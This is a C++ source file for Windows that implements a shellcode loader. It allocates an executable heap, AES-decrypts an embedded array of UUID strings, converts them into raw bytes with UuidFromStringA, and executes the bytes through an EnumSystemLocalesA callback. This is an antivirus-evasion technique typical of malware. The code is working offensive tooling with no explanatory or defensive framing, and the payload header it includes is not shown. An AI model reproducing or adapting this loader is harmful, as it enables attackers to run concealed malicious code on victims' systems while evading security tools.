// ReSharper disable CppLocalVariableMayBeConst
// ReSharper disable CppUseAuto
// ReSharper disable CppClangTidyModernizeUseAuto
// ReSharper disable CppCStyleCast
// ReSharper disable CppClangTidyClangDiagnosticCastQual
#include <iostream>
#include <Rpc.h>
#include <Windows.h>

#include "aes.h"
//#include "Payload.h"
#include "CryptPayload.h"
#include "filters.h"
#include "modes.h"

#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "cryptlib")

int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
	//int elems = sizeof(uuids) / sizeof(uuids[0]);
    int elems = sizeof(encryptedUuids) / sizeof(encryptedUuids[0]);

    CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
    dec.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));
	
    for (int i = 0; i < elems; i++) {
	    std::string recoveredUuid;
    	CryptoPP::ArraySource s(encryptedUuids[i], sizeof(encryptedUuids[i]), true,
                                 new CryptoPP::StreamTransformationFilter(dec,
                                                                          new CryptoPP::StringSink(recoveredUuid)
                                 ) // StreamTransformationFilter
        ); // StringSource

#ifdef _DEBUG
        printf("%s\n", recoveredUuid.c_str());
#endif
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)recoveredUuid.c_str(), (UUID*)hptr);
    	//RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
#ifdef _DEBUG
            printf("UuidFromStringA() != S_OK\n");
#endif
            CloseHandle(ha);

            return -1;
        }
        hptr += 16;
    }
	
#ifdef _DEBUG
    printf("[*] Hexdump: ");
    for (int i = 0; i < elems * 16; i++) {
        printf("%02X ", ((unsigned char*)ha)[i]);
    }
#endif

	EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}